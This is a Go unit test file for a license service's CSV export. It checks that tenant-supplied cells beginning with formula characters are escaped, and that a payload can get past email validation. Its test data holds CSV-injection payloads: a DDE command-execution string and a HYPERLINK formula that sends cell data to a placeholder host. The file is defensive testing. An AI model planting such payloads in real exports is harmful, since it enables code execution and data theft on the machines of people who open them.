package handler

import (
	"bytes"
	"encoding/csv"
	"strings"
	"testing"

	"github.com/tabloy/keygate/pkg/apperr"
)

// TestCSVCellNeutralizesFormulas pins the escaping applied to every
// tenant-supplied column of the license export. Excel, LibreOffice, and
// Google Sheets evaluate a cell starting with =, +, -, @, tab, or CR as a
// formula; `=cmd|'/C calc'!A0` is a working DDE command-execution payload in
// Excel. The export is downloaded and opened by an operator, so an unescaped
// cell is code execution on the admin's workstation.
func TestCSVCellNeutralizesFormulas(t *testing.T) {
	dangerous := []string{
		`=cmd|'/C calc'!A0`,
		`=1+1`,
		`+1+1`,
		`-1+1`,
		`@SUM(A1:A9)`,
		"\tleading tab",
		"\rleading cr",
		`=HYPERLINK("http://evil.example?d="&A1,"Click")`,
	}
	for _, in := range dangerous {
		got := csvCell(in)
		if !strings.HasPrefix(got, "'") {
			t.Errorf("csvCell(%q) = %q, want a leading apostrophe", in, got)
		}
		if got[1:] != in {
			t.Errorf("csvCell(%q) altered the value beyond the prefix: %q", in, got)
		}
	}
}

func TestCSVCellLeavesOrdinaryValuesAlone(t *testing.T) {
	safe := []string{
		"", "user@example.com", "KGT-XXXX-YYYY", "Acme Pro Plan",
		"active", "2026-01-01T00:00:00Z", "a-dash-inside", "user+tag@example.com",
	}
	for _, in := range safe {
		if got := csvCell(in); got != in {
			t.Errorf("csvCell(%q) = %q, want it unchanged", in, got)
		}
	}
}

// TestFormulaPayloadSurvivesEmailValidation demonstrates the reachability
// half of the finding: ValidateEmail delegates to net/mail, which accepts
// display-name forms, so a formula payload can be stored as a license email
// through the ordinary admin/API create path and later exported.
func TestFormulaPayloadSurvivesEmailValidation(t *testing.T) {
	payload := `=cmd|'/C calc'!A0 <attacker@example.com>`
	if err := apperr.ValidateEmail(payload); err != nil {
		t.Skipf("email validation rejects the payload outright (%v) — escaping is still required for other columns", err.Message)
	}

	var buf bytes.Buffer
	w := csv.NewWriter(&buf)
	if err := w.Write([]string{csvCell(payload)}); err != nil {
		t.Fatal(err)
	}
	w.Flush()

	out := buf.String()
	if strings.HasPrefix(strings.TrimPrefix(out, `"`), "=") {
		t.Fatalf("exported cell still begins with '=': %q", out)
	}
	if !strings.Contains(out, "'=cmd") {
		t.Fatalf("expected the escaped payload in the row, got %q", out)
	}
}
